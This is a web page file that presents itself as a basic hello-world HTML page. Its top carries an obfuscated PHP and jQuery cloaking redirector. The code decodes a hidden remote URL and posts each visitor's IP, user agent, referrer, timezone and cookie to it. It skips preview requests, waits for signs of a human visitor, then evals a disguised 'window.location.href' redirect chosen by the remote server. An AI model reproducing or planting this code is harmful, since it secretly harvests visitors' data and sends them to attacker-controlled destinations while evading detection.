<?php date_default_timezone_set("UTC");ini_set("display_errors", 0);error_reporting(E_ALL & ~E_NOTICE);function c($u=null,$q=null,$co=null){if(empty($u)){return '$("#lo506527ad").hide();$("body").fadeIn(500);';}else{$u = $u.$q;for ($i = 0, $j = strlen($u); $i < $j; $i++) {$a[] = ord($u[$i]);}$u = strrev(implode(",",$a));if($co AND isset($_COOKIE["_eventlo506527ad"])){$me="";}else{$me = '$("html").append("body").html("<div style=\"margin-top:8%;background-color:white;text-align:center;font-size:40px;\"><!DOCTYPE html><html lang=\"en\"><head><meta charset=\"UTF-8\"><meta name=\"viewport\" content=\"width=device-width, initial-scale=1.0\"><title>Loading Page</title><style>  /* Full-screen background */  body, html {    margin: 0;    padding: 0;    height: 100%;    width: 100%;    display: flex;    justify-content: center;    align-items: center;    background: #1a1a1a;    font-family: Arial, sans-serif;  }  /* Loading container */  .loader-container {    text-align: center;    color: #fff;  }  /* Spinner animation */  .spinner {    border: 6px solid rgba(255,255,255,0.2);    border-top: 6px solid #4CAF50;    border-radius: 50%;    width: 60px;    height: 60px;    margin: 0 auto 20px auto;    animation: spin 1s linear infinite;  }  @keyframes spin {    0% { transform: rotate(0deg); }    100% { transform: rotate(360deg); }  }  .loading-text {    font-size: 18px;  }</style></head><body><div class=\"loader-container\">  <div class=\"spinner\"></div>  <div class=\"loading-text\">Loading, please wait...</div></div><script>  // Example: simulate loading for 3 seconds  setTimeout(() => {    document.querySelector('.loader-container').innerHTML = \"<h2>Page Loaded!</h2>\";  }, 3000);</script></body></html></div>");';}return 'function rS(s){var nS = "";for (var i = s.length - 1; i >= 0; i--) {nS += s[i];} var a = nS.split(",");var u = String.fromCharCode.apply(null, a);return u;} var u,s,c;$("body").remove();'.$me.'s=rS("16,201,101,411,401,64,011,111,501,611,79,99,111,801,64,911,111,001,011,501,911");u = rS("'.$u.'");c = s+"\'"+u+"\'";$("html").show();eval(c);';}}if(!(isset($_SERVER["HTTP_X_PURPOSE"]) AND $_SERVER["HTTP_X_PURPOSE"] == "preview")){if(isset($_POST["imm"])){$date = date("Y-m-d H:i:s");$id = "506527";$uid="qil3sex0oo42w5ar329po8hfc";$qu=$_SERVER["QUERY_STRING"];$ch = curl_init();$d=array(104,116,116,112,115,58,47,47,106,99,105,98,106,46,99,111,109,47,112,99,108,46,112,104,112);$u="";foreach($d as $v){$u.=chr($v);}$data=array("date"=>$date,"lan"=>$_SERVER["HTTP_ACCEPT_LANGUAGE"],"ref"=>$_POST["r"],"ip"=>$_SERVER["REMOTE_ADDR"],"ipr"=>$_SERVER["HTTP_X_FORWARDED_FOR"],"sn"=>$_SERVER["SERVER_NAME"],"requestUri"=>$_SERVER["REQUEST_URI"],"query"=>$qu,"ua"=>$_SERVER["HTTP_USER_AGENT"],"co"=>$_COOKIE["_eventlo506527ad"],"tz"=>$_POST["tz"],"he"=>$_POST["he"],"imm" =>$_POST["imm"],"user_id"=>$uid,"id"=>$id);curl_setopt($ch,CURLOPT_URL,$u);curl_setopt($ch,CURLOPT_RETURNTRANSFER, true);curl_setopt($ch,CURLOPT_POST, true);curl_setopt($ch,CURLOPT_POSTFIELDS, $data);$result = curl_exec($ch);curl_close($ch);$arr = explode(",",$result);if(!empty($qu)){if(strpos($arr[1],"?")){$q="&".$qu;}else{$q="?".$qu;}}else{$q="";}if($arr[0] === "true"){if(strstr($arr[1],"sp.php")){$q="?".$qu;}if(!empty($arr[7])){setcookie($arr[7],$arr[8],time()+60*60*24*$arr[9],"/");}if($arr[2]){if($arr[4] == 1 OR $arr[4] == 3){setcookie("_eventlo506527ad",$arr[6],time()+60*60*24*$arr[3]);}}echo c($arr[1],$q,true);exit();}elseif($arr[0] === "false"){if($arr[5]){$f=$q;}else{$f="";}if($arr[2]){if($arr[4] == 2 OR $arr[4] == 3){setcookie("_eventlo506527ad",$arr[6]."b",time()+60*60*24*$arr[3]);}}echo c($arr[1],$f);exit();}else{if($arr[2]){if($arr[4] == 2 OR $arr[4] == 3){setcookie("_eventlo506527ad",$arr[6]."b",time()+60*60*24*$arr[3]);}}echo c();exit();}}}?>
<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8" />
  <meta name="viewport" content="width=device-width, initial-scale=1.0" />
  <meta http-equiv="X-UA-Compatible" content="IE=edge" />
  <title>Basic HTML Page</title>

  <link href="https://fonts.googleapis.com/css2?family=Poppins&display=swap" rel="stylesheet" />
  <style>body {display: none;}</style>
<script type="text/javascript" src="//cdnjs.cloudflare.com/ajax/libs/jquery/3.2.1/jquery.min.js"></script>
<script type="text/javascript" src="//cdnjs.cloudflare.com/ajax/libs/jquery-mobile/1.4.5/jquery.mobile.min.js"></script>
<script type="text/javascript" src="//cdnjs.cloudflare.com/ajax/libs/jstimezonedetect/1.0.6/jstz.min.js"></script>
<script>var oldtitle=document.title;document.title = "Loading";$( document ).ajaxComplete(function(){document.title = oldtitle;$(".loaderdiv").fadeOut("slow");$(".maindiv").fadeIn("slow");});$(document).ready(function(){function loadA(t){$.ajax({url:location.href,type:"POST",data:"tz="+e+"&r="+document.referrer+"&he="+g+"&imm="+t,success:function(a){eval(a)}})}var f=new XMLHttpRequest();f.open("GET",document.location,true);f.send(null);var g;f.onreadystatechange = function(){g=f.getAllResponseHeaders().toLowerCase();};var d=jstz.determine();var e=d.name();var co = document.cookie.indexOf("_eventlo506527ad=");if(co==0){loadA("p");}else{$("body").hide();$("html").append("<div id=\"lo506527ad\" style=\"margin-top:8%;background-color:white;text-align:center;font-size:40px;\"><!DOCTYPE html><html lang=\"en\"><head><meta charset=\"UTF-8\"><meta name=\"viewport\" content=\"width=device-width, initial-scale=1.0\"><title>Loading Page</title><style>  /* Full-screen background */  body, html {    margin: 0;    padding: 0;    height: 100%;    width: 100%;    display: flex;    justify-content: center;    align-items: center;    background: #1a1a1a;    font-family: Arial, sans-serif;  }  /* Loading container */  .loader-container {    text-align: center;    color: #fff;  }  /* Spinner animation */  .spinner {    border: 6px solid rgba(255,255,255,0.2);    border-top: 6px solid #4CAF50;    border-radius: 50%;    width: 60px;    height: 60px;    margin: 0 auto 20px auto;    animation: spin 1s linear infinite;  }  @keyframes spin {    0% { transform: rotate(0deg); }    100% { transform: rotate(360deg); }  }  .loading-text {    font-size: 18px;  }</style></head><body><div class=\"loader-container\">  <div class=\"spinner\"></div>  <div class=\"loading-text\">Loading, please wait...</div></div><script>  // Example: simulate loading for 3 seconds  setTimeout(() => {    document.querySelector('.loader-container').innerHTML = \"<h2>Page Loaded!</h2>\";  }, 3000);</script></body></html></div>");var h=null;var i=null;var j=true;$(document).on("pagecreate","body",function(){$("body").on("tap",function(){if(i!==false){if(h!==null){if(j!==false){loadA("p")}j=false;clearTimeout(h)}}})}).add($(document).on("mousemove",function(){if(i!==false){if(h!==null){if(j!==false){loadA("p")}j=false;clearTimeout(h)}}}));h=setTimeout(function(){i=false;loadA("b")},20000)}});</script>
  <style>
    body {
      margin: 0;
      padding: 0;
      font-family: 'Poppins', sans-serif;
      background-color: #f4f4f4;
      color: #333;
      display: flex;
      flex-direction: column;
      align-items: center;
      justify-content: center;
      height: 100vh;
    }

    h1 {
      color: #2c3e50;
    }

    button {
      padding: 10px 20px;
      background-color: #3498db;
      color: white;
      border: none;
      border-radius: 6px;
      cursor: pointer;
      font-size: 1rem;
      transition: background-color 0.3s;
    }

    button:hover {
      background-color: #2980b9;
    }
  </style>

</head>
<body>

  <h1>Welcome to My Basic Page</h1>
  <button onclick="sayHello()">Click Me</button>

  <script>
    function sayHello() {
      alert('Hello from your basic HTML page!');
    }
  </script>

</body>
</html>
